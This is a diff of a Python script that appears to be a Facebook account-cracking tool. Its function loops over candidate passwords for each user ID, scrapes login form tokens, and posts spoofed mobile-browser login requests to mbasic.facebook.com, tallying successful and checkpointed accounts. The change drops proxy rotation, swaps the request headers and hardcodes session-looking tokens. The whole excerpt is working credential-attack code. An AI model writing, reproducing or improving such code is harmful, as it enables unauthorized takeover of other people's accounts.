@@ -1355,61 +1355,53 @@ def p(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M3) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number": 0,
-            "unrecognized_tries": 0,
-            "email": uid,
-            "prefill_contact_point": "",
-            "prefill_source": "",
-            "prefill_type": "",
-            "first_prefill_source": "",
-            "first_prefill_type": "",
-            "had_cp_prefilled": False,
-            "had_password_prefilled": False,
-            "is_smart_lock": False,
-            "bi_xrwh": 0,
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'bi_wvdp': '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function () { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "__dyn": "",
-            "__csr": "",
-            "__req": random.choice(["1","2","3","4","5","6","7","8","9","0"]),
-            "__a": "",
-            "__user": 0,}
-            headers = {
-            'authority': 'mbasic.facebook.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '2.75',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"23053RN02A"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"14.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '393',
-            'x-asbd-id': '129477',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream',}
+            'fb_dtsg': 'NAcNU90r90HMopJwmKP9imzzLWlxo_iKfTyvdnr6r7DyS3tmVW08BWA:0:0',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'dyn': '1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1EE2Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0k-0jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
+            'csr': '',
+            'req': '5',
+            'fmt': '1',
+            'a': 'AYn0Bg0ThYbHgICnv29DP9CHcjwOA3kA6mYeCFVN-bkp0jy2izLJEOYVcvsJfYldFqp_Dh1qmf9Zk4zR3xYO_R-ocF2kvMayyjLRp9E84G5uJA',
+            'user': '0',}
+            headers =  {
+            'Host': 'mbasic.facebook.com',
+            'Connection': 'keep-alive',
+            'Origin': 'https://mbasic.facebook.com',
+            'Viewport-Width': '360',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 HeyTapBrowser/45.7.5.9',
+            'X-Response-Format': 'JSONStream',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-ASBD-ID': '129477',
+            'DPR': '2',
+            'Accept': '*/*',
+            'Referer': 'https://m.facebook.com/',
+            'Accept-Language': 'en-US',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100'
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
